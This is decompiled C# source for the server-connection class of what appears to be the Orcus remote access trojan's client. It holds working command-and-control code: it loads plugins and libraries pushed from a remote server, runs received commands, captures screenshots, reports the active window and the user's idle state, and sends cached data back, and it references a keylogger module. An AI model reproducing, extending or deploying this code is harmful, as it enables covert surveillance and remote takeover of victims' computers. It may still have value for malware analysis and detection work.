using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Orcus.CommandManagement;
using Orcus.Config;
using Orcus.Connection.Args;
using Orcus.Core;
using Orcus.Native;
using Orcus.Plugins;
using Orcus.Shared.Communication;
using Orcus.Shared.Compression;
using Orcus.Shared.Connection;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities;
using Orcus.Shared.Utilities.Compression;
using Orcus.StaticCommandManagement;
using Orcus.Utilities;
using Orcus.Utilities.KeyLogger;

namespace Orcus.Connection;

public class ServerConnection : IDisposable, IServerConnection
{
	private readonly IClientInfo _clientInfo;

	private readonly Func<byte> _readByteDelegate;

	private readonly SslStream _sslStream;

	private readonly Timer _onlineCheckTimer;

	private const int OnlineCheckInterval = 300000;

	public List<AdministrationConnection> AdministrationConnections { get; }

	public bool IsConnected { get; private set; }

	public object SendLock { get; }

	public BinaryReader BinaryReader { get; }

	public BinaryWriter BinaryWriter { get; }

	public TcpClient TcpClient { get; }

	public event EventHandler Disconnected;

	public event EventHandler<FileTransferEventArgs> FileTransferAccepted;

	public event EventHandler<FileTransferEventArgs> FileTransferCompleted;

	public event EventHandler<StaticCommandPluginReceivedEventArgs> StaticCommandPluginReceived;

	public ServerConnection(TcpClient client, SslStream sslStream, BinaryReader reader, BinaryWriter writer, DatabaseConnection databaseConnection, IClientInfo clientInfo)
	{
		_sslStream = sslStream;
		_clientInfo = clientInfo;
		BinaryReader = reader;
		BinaryWriter = writer;
		TcpClient = client;
		AdministrationConnections = new List<AdministrationConnection>();
		_readByteDelegate = (Func<byte>)Delegate.Combine(_readByteDelegate, new Func<byte>(BinaryReader.ReadByte));
		_readByteDelegate.BeginInvoke(EndRead, null);
		SendLock = new object();
		IsConnected = true;
		databaseConnection.ServerConnection = this;
		try
		{
			SendCachedPackages();
		}
		catch (Exception exception)
		{
			ErrorReporter.Current.ReportError(exception, "Send Cached Packages");
		}
		_onlineCheckTimer = new Timer(OnlineCheckTimerCallback, null, 300000, -1);
	}

	public void Dispose()
	{
		this.Disconnected?.Invoke(this, EventArgs.Empty);
		BinaryReader.Close();
		BinaryWriter.Close();
		_sslStream.Dispose();
		TcpClient.Close();
		IsConnected = false;
	}

	private void OnlineCheckTimerCallback(object state)
	{
		if (!IsConnected)
		{
			return;
		}
		try
		{
			lock (SendLock)
			{
				BinaryWriter.Write((byte)36);
				BinaryWriter.Write(0);
			}
		}
		catch (Exception)
		{
			Dispose();
		}
		_onlineCheckTimer.Change(300000, -1);
	}

	public void SendServerPackage(ServerPackageType serverPackageType, byte[] data, bool redirectPackage, ushort administrationId)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		ServerPackage val = new ServerPackage();
		val.set_Data(data);
		val.set_ServerPackageType(serverPackageType);
		object redirectPackage2;
		if (!redirectPackage)
		{
			redirectPackage2 = null;
		}
		else
		{
			RedirectPackage val2 = new RedirectPackage();
			redirectPackage2 = (object)val2;
			val2.set_Administration(administrationId);
		}
		val.set_RedirectPackage((RedirectPackage)redirectPackage2);
		ServerPackage val3 = val;
		byte[] array = new Serializer(typeof(ServerPackage)).Serialize((object)val3);
		lock (SendLock)
		{
			try
			{
				BinaryWriter.Write((byte)2);
				BinaryWriter.Write(array.Length);
				BinaryWriter.Write(array);
				BinaryWriter.Flush();
			}
			catch (ObjectDisposedException)
			{
			}
		}
	}

	public void PushExceptions(byte[] exceptions)
	{
		lock (SendLock)
		{
			BinaryWriter.Write((byte)12);
			byte[] array = LZF.Compress(exceptions, 0);
			BinaryWriter.Write(array.Length);
			BinaryWriter.Write(array);
		}
	}

	public void InitializeFileTransfer(Guid guid)
	{
		lock (SendLock)
		{
			BinaryWriter.Write((byte)21);
			BinaryWriter.Write(16);
			BinaryWriter.Write(guid.ToByteArray());
		}
	}

	public void SendBytes(FromClientPackage token, byte[] package)
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		lock (SendLock)
		{
			BinaryWriter.Write((byte)token);
			BinaryWriter.Write(package.Length);
			BinaryWriter.Write(package);
			BinaryWriter.Flush();
		}
	}

	private void EndRead(IAsyncResult asyncResult)
	{
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Invalid comparison between Unknown and I4
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Invalid comparison between Unknown and I4
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Invalid comparison between Unknown and I4
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0169: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected I4, but got Unknown
		try
		{
			byte parameter = _readByteDelegate.EndInvoke(asyncResult);
			int size = BinaryReader.ReadInt32();
			FromAdministrationPackage val = (FromAdministrationPackage)parameter;
			byte[] bytes;
			ushort administrationId;
			if (val - 2 > 1)
			{
				if ((int)val != 18)
				{
					if ((int)val != 21)
					{
						bytes = BinaryReader.ReadBytes(size);
						ThreadPool.QueueUserWorkItem(delegate
						{
							try
							{
								ProcessResponse(parameter, size, bytes);
							}
							catch (Exception exception3)
							{
								ErrorReporter.Current.ReportError(exception3, $"void ProcessResponse || Parameter: {(object)(FromAdministrationPackage)parameter}, Size: {size} B");
							}
						});
					}
					else
					{
						administrationId = BinaryReader.ReadUInt16();
						try
						{
							List<PortableLibraryInfo> obj = (List<PortableLibraryInfo>)new Serializer(typeof(List<PortableLibraryInfo>)).Deserialize(BinaryReader.BaseStream);
							PortableLibrary val2 = (PortableLibrary)0;
							foreach (PortableLibraryInfo item in obj)
							{
								try
								{
									LibraryLoader.Current.LoadLibrary(item.get_Library(), _sslStream, item.get_Length());
								}
								catch (Exception)
								{
									continue;
								}
								val2 = (PortableLibrary)(val2 | item.get_Library());
							}
							lock (SendLock)
							{
								BinaryWriter.Write((byte)35);
								BinaryWriter.Write(6);
								BinaryWriter.Write(BitConverter.GetBytes(administrationId));
								BinaryWriter.Write(BitConverter.GetBytes((int)val2));
							}
						}
						catch (Exception exception)
						{
							ErrorReporter.Current.ReportError(exception, $"void ProcessResponse || Parameter: {(object)(FromAdministrationPackage)parameter}, Size: {size} B");
						}
					}
				}
				else
				{
					administrationId = BinaryReader.ReadUInt16();
					int num = BinaryReader.ReadInt32();
					Guid guid = new Guid(BinaryReader.ReadBytes(16));
					byte[] md5Hash = BinaryReader.ReadBytes(16);
					byte[] array = BinaryReader.ReadBytes(BinaryReader.ReadInt32());
					string @string = Encoding.ASCII.GetString(array);
					try
					{
						PluginReceiver pluginReceiver = new PluginReceiver(administrationId, guid, md5Hash, @string);
						byte[] array2 = new byte[8192];
						int num2;
						while (num > 0 && (num2 = BinaryReader.Read(array2, 0, Math.Min(array2.Length, num))) > 0)
						{
							pluginReceiver.FileStream.Write(array2, 0, num2);
							num -= num2;
						}
						if (pluginReceiver.ImportPlugin() && LoadPlugin(pluginReceiver.Guid, PluginVersion.Parse(pluginReceiver.Version)))
						{
							lock (SendLock)
							{
								BinaryWriter.Write((byte)16);
								BinaryWriter.Write(16 + array.Length);
								BinaryWriter.Write(guid.ToByteArray());
								BinaryWriter.Write(array);
							}
						}
						else
						{
							lock (SendLock)
							{
								BinaryWriter.Write((byte)17);
								BinaryWriter.Write(18 + array.Length);
								BinaryWriter.Write(BitConverter.GetBytes(pluginReceiver.AdministrationId));
								BinaryWriter.Write(guid.ToByteArray());
								BinaryWriter.Write(array);
							}
						}
					}
					catch (Exception exception2)
					{
						ErrorReporter.Current.ReportError(exception2, $"void ProcessResponse || Parameter: {(object)(FromAdministrationPackage)parameter}, Size: {size} B");
					}
				}
			}
			else
			{
				bytes = BinaryReader.ReadBytes(size);
				administrationId = BitConverter.ToUInt16(bytes, 0);
				bool flag;
				byte[] data = ((flag = parameter == 3) ? LZF.Decompress(bytes, 3) : bytes);
				AdministrationConnections.FirstOrDefault((AdministrationConnection x) => x.Id == administrationId)?.PackageReceived(bytes[2], data, (!flag) ? 3 : 0);
			}
			_readByteDelegate.BeginInvoke(EndRead, null);
		}
		catch (Exception)
		{
			Dispose();
		}
	}

	private void ProcessResponse(byte parameter, int size, byte[] bytes)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected I4, but got Unknown
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_019b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0365: Unknown result type (might be due to invalid IL or missing references)
		//IL_036c: Expected O, but got Unknown
		//IL_050c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0559: Unknown result type (might be due to invalid IL or missing references)
		//IL_055d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0562: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a7: Expected I4, but got Unknown
		FromAdministrationPackage val = (FromAdministrationPackage)parameter;
		switch ((int)val)
		{
		case 0:
		{
			ushort num2 = BitConverter.ToUInt16(bytes, 0);
			AdministrationConnection administrationConnection2 = new AdministrationConnection(num2, this, _clientInfo);
			administrationConnection2.SendFailed += delegate
			{
				Dispose();
			};
			AdministrationConnections.Add(administrationConnection2);
			lock (SendLock)
			{
				BinaryWriter.Write((byte)3);
				BinaryWriter.Write(2);
				BinaryWriter.Write(BitConverter.GetBytes(num2));
				break;
			}
		}
		case 1:
		{
			ushort closingSessionId = BitConverter.ToUInt16(bytes, 0);
			AdministrationConnection administrationConnection = AdministrationConnections.FirstOrDefault((AdministrationConnection x) => x.Id == closingSessionId);
			if (administrationConnection != null)
			{
				AdministrationConnections.Remove(administrationConnection);
				administrationConnection.Dispose();
			}
			break;
		}
		case 6:
		{
			PotentialCommand potentialCommand = new Serializer(typeof(PotentialCommand)).Deserialize<PotentialCommand>(bytes, 0);
			StaticCommandSelector.Current.ExecuteCommand(potentialCommand);
			break;
		}
		case 7:
		{
			PotentialCommand potentialCommand = new Serializer(typeof(PotentialCommand)).Deserialize<PotentialCommand>(LZF.Decompress(bytes, 0), 0);
			StaticCommandSelector.Current.ExecuteCommand(potentialCommand);
			break;
		}
		case 8:
		{
			Guid guid = new Guid(bytes.Skip(2).Take(16).ToArray());
			PluginVersion val5 = new Serializer(typeof(PluginVersion)).Deserialize<PluginVersion>(bytes, 18);
			byte[] bytes2 = Encoding.ASCII.GetBytes(((object)val5).ToString());
			if (LoadPlugin(guid, val5))
			{
				lock (SendLock)
				{
					BinaryWriter.Write((byte)16);
					BinaryWriter.Write(16 + bytes2.Length);
					BinaryWriter.Write(guid.ToByteArray());
					BinaryWriter.Write(bytes2);
					break;
				}
			}
			lock (SendLock)
			{
				BinaryWriter.Write((byte)17);
				BinaryWriter.Write(18 + bytes2.Length);
				BinaryWriter.Write(bytes, 0, 2);
				BinaryWriter.Write(guid.ToByteArray());
				BinaryWriter.Write(bytes2);
				break;
			}
		}
		case 12:
			try
			{
				string text = "";
				LASTINPUTINFO plii = default(LASTINPUTINFO);
				plii.cbSize = (uint)Marshal.SizeOf((object)plii);
				if (NativeMethods.GetLastInputInfo(ref plii) && (uint)(Environment.TickCount - (int)plii.dwTime) > 900000u)
				{
					text += "[Idle] ";
				}
				text += ActiveWindowHook.GetActiveWindowTitle();
				byte[] bytes3 = Encoding.UTF8.GetBytes(text);
				lock (SendLock)
				{
					BinaryWriter.Write((byte)19);
					BinaryWriter.Write(bytes3.Length + 2);
					BinaryWriter.Write(bytes);
					BinaryWriter.Write(bytes3);
					break;
				}
			}
			catch (Exception exception2)
			{
				ErrorReporter.Current.ReportError(exception2, "case FromAdministrationPackage.GetActiveWindow");
				break;
			}
		case 13:
			try
			{
				JpgCompression val3 = new JpgCompression(75);
				try
				{
					byte[] array2;
					using (MemoryStream memoryStream = new MemoryStream())
					{
						Bitmap val4 = ScreenHelper.TakeScreenshot();
						try
						{
							val3.Compress(val4, (Stream)memoryStream);
							array2 = memoryStream.ToArray();
						}
						finally
						{
							((IDisposable)val4)?.Dispose();
						}
					}
					lock (SendLock)
					{
						BinaryWriter.Write((byte)20);
						BinaryWriter.Write(array2.Length + 2);
						BinaryWriter.Write(bytes);
						BinaryWriter.Write(array2);
						break;
					}
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
			}
			catch (Exception exception)
			{
				ErrorReporter.Current.ReportError(exception, "case FromAdministrationPackage.GetScreen");
				break;
			}
		case 14:
			this.FileTransferAccepted?.Invoke(this, new FileTransferEventArgs(new Guid(bytes)));
			break;
		case 15:
			this.FileTransferCompleted?.Invoke(this, new FileTransferEventArgs(new Guid(bytes)));
			break;
		case 16:
			lock (SendLock)
			{
				BinaryWriter.Write((byte)27);
				BinaryWriter.Write(0);
				break;
			}
		case 17:
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Consts.StaticCommandPluginsDirectory);
			if (!directoryInfo.Exists)
			{
				directoryInfo.Create();
			}
			string uniqueFileName = FileExtensions.GetUniqueFileName(directoryInfo.FullName);
			using (FileStream fileStream = new FileStream(uniqueFileName, FileMode.CreateNew, FileAccess.Write))
			{
				fileStream.Write(bytes, 4, bytes.Length - 4);
			}
			this.StaticCommandPluginReceived?.Invoke(this, new StaticCommandPluginReceivedEventArgs(uniqueFileName, BitConverter.ToInt32(bytes, 0)));
			break;
		}
		case 20:
		{
			PortableLibrary libraries = (PortableLibrary)BitConverter.ToInt32(bytes, 2);
			int num = (size - 6) / 16;
			List<byte[]> list = new List<byte[]>(num);
			for (int i = 0; i < num; i++)
			{
				byte[] array = new byte[16];
				Buffer.BlockCopy(bytes, 6 + i * 16, array, 0, 16);
				list.Add(array);
			}
			PortableLibrary val2 = LibraryLoader.Current.CheckLibraries(libraries, list);
			lock (SendLock)
			{
				BinaryWriter.Write((byte)34);
				BinaryWriter.Write(6);
				BinaryWriter.Write(bytes, 0, 2);
				BinaryWriter.Write(BitConverter.GetBytes((int)val2));
				break;
			}
		}
		case 22:
			StaticCommandSelector.Current.StopActiveCommand(BitConverter.ToInt32(bytes, 0));
			break;
		case 2:
		case 3:
		case 4:
		case 5:
		case 9:
		case 10:
		case 11:
		case 18:
		case 19:
		case 21:
			break;
		}
	}

	private void SendCachedPackages()
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Consts.SendToServerPackages);
		if (!directoryInfo.Exists)
		{
			return;
		}
		lock (SendLock)
		{
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				BinaryWriter.Write(File.ReadAllBytes(fileInfo.FullName));
				fileInfo.Delete();
			}
		}
	}

	private bool LoadPlugin(Guid guid, PluginVersion version)
	{
		FileInfo fileInfo = new FileInfo(Path.Combine(Consts.PluginsDirectory, $"{guid:N}_{version}"));
		if (fileInfo.Exists)
		{
			try
			{
				PluginLoader.Current.LoadPlugin(fileInfo.FullName, version);
				return true;
			}
			catch (Exception)
			{
			}
		}
		return false;
	}
}
